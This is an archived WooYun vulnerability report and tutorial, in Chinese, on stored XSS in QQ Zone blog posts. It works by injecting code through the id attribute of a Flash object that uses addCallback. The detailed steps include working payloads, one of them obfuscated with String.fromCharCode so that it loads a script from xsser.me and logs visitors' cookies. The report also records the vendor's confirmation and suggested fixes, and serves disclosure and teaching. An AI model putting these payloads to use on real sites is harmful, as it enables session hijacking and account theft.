@@ -1,0 +1,347 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2013-01-01 21:44</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-25：	细节向普通白帽子公开<br/>
+									2013-02-04：	细节向实习白帽子公开<br/>
+									2013-02-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">有些时候，我们拿现成的XSS代码都不行，都被过滤了，那么需要我们对过滤的规则进行一定的判断与猜测。然后针对性的使用一些技巧来适应或者绕过规则。<br />
+<br />
+在本例中，我们以QQ空间/QQ校友的日志功能为例，通过猜测简单的过滤规则，然后使用含有addCallback的flash，来实现了存储型XSS的构造。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 前提：本例需在IE9，IE10下进行。<br />
+<br />
+<br />
+<br />
+2. 我们乌云上报告的一些已有案例，进行了再次测试。<br />
+<br />
+<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-013721">WooYun: PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS</a> <br />
+<br />
+<br />
+<br />
+上例中，提到了QQ空间日志并未对object标签进行有效的过滤。<br />
+<br />
+<br />
+<br />
+3. 我们根据此例中的代码对过滤规则进行测试：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+以上的代码，是可以正常提交，并且未过滤的。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://mysite.com/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://mysite.com/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+而当swf的域名不是qzs.qq.com时候，代码将会被过滤为以下内容。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+即地址被去掉了。<br />
+<br />
+<br />
+<br />
+4. 那么我们已知了这个过滤规则， 就有2种绕过的方式。<br />
+<br />
+<br />
+<br />
+4.1 找到一个qzs.qq.com域名下存在缺陷的FLASH，然后加以利用。<br />
+<br />
+<br />
+<br />
+此方法，已经在 @gainover 的  <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-013721">WooYun: PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS</a>  有所介绍了。<br />
+<br />
+<br />
+<br />
+4.2 利用Flash的addcallback缺陷来构造存储型XSS。<br />
+<br />
+<br />
+<br />
+5. 首先说下flash addcallback方法的基本原理。<br />
+<br />
+<br />
+<br />
+根据flash sdk 里的源代码，我们可以得到flash addcallback 的源代码中有以下代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>if ((((activeX == true)) &amp;&amp; (!((objectID == null))))){<br />
+	_evalJS(((((&quot;__flash__addCallback(document.getElementById(\&quot;&quot; + objectID) + &quot;\&quot;), \&quot;&quot;) + functionName) + &quot;\&quot;);&quot;));<br />
+};</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/011958439fdb2c8bc30c5efae99078785f7b273c.jpg" target="_blank"><img src="../images/011958439fdb2c8bc30c5efae99078785f7b273c.jpg" alt="108.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+其中objectID为调用FLASH的HTML标签的ID。functionName则为被JS所调用的函数名称。<br />
+<br />
+<br />
+<br />
+6. 当我们有以下代码时：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object id=&quot;aaaa&quot; width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+且http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf 中存在一句<br />
+<br />
+<br />
+<br />
+ExternalInterface.addCallback(&quot;myfunc&quot;,funcInFlash);<br />
+<br />
+<br />
+<br />
+则有<br />
+<br />
+</p><pre><code>objectID=&quot;aaaa&quot;;<br />
+functionName=&quot;myfunc&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+代入上面那句_evalJS中，则有<br />
+<br />
+<br />
+<br />
+</p><pre><code>__flash__addCallback(document.getElementById(&quot;aaaa&quot;), &quot;myfunc&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+7. 那么我们可以想象一下，如果 aaaa 替换为   aaaa&quot;),alert(1),(&quot;<br />
+<br />
+<br />
+<br />
+则上面代码变为<br />
+<br />
+<br />
+<br />
+</p><pre><code>__flash__addCallback(document.getElementById(&quot;aaaa&quot;),alert(1),(&quot;&quot;), &quot;myfunc&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+解析：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/011958551b8920fe0dd49137cdf34e2a1c90408c.jpg" target="_blank"><img src="../images/011958551b8920fe0dd49137cdf34e2a1c90408c.jpg" alt="104.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 且FLASH中，确实未对objectID做任何过滤。 基于以上内容，我们可以构建利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object id=&#039;aaaa&quot;),alert(1),(&quot;&#039; width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们自己用上面这段代码先在自己网站上测试下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01195903747f9c96a79dbf617e38ccb846e61257.jpg" target="_blank"><img src="../images/01195903747f9c96a79dbf617e38ccb846e61257.jpg" alt="105.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+看，果然id里的代码被执行了！<br />
+<br />
+<br />
+<br />
+9. 利用以上原理，接着我们在QQ空间里来做测试，至于FLASH么，就是现成的！<br />
+<br />
+<br />
+<br />
+虽然这个FLASH里没有缺陷，但是存在addCallback的调用，我们就可以直接用它。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; id=&quot;xsstest1&amp;quot),(function(){if(!window.__x){window.__x=1;window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,101,114,46,109,101,47,66,113,112,57,82,121);document.body.appendChild(window.s);}})(),(&amp;quot;&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+发布日志，使用以上代码<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/011959161519860ac7e4867c7b77dbb71f3da484.jpg" target="_blank"><img src="../images/011959161519860ac7e4867c7b77dbb71f3da484.jpg" alt="106.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 当用户访问含有XSS代码的日志后，我们可以在xsser.me查看所记录的cookies内容。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0119592592822ea40ad4d15cbf26cccb35ec209a.jpg" target="_blank"><img src="../images/0119592592822ea40ad4d15cbf26cccb35ec209a.jpg" alt="107.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明，仅IE9, 10 受影响。QQ空间/校友同时受影响。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 过滤object标签<br />
+<br />
+2. 设置allowscriptaccess为never ，即使设置为 sameDomain, 也可能找到同域下含有addCallback调用的FLASH。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016803" title="[腾讯实例教程] 那些年我们一起学XSS - 21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2013-01-05 10:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16803";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
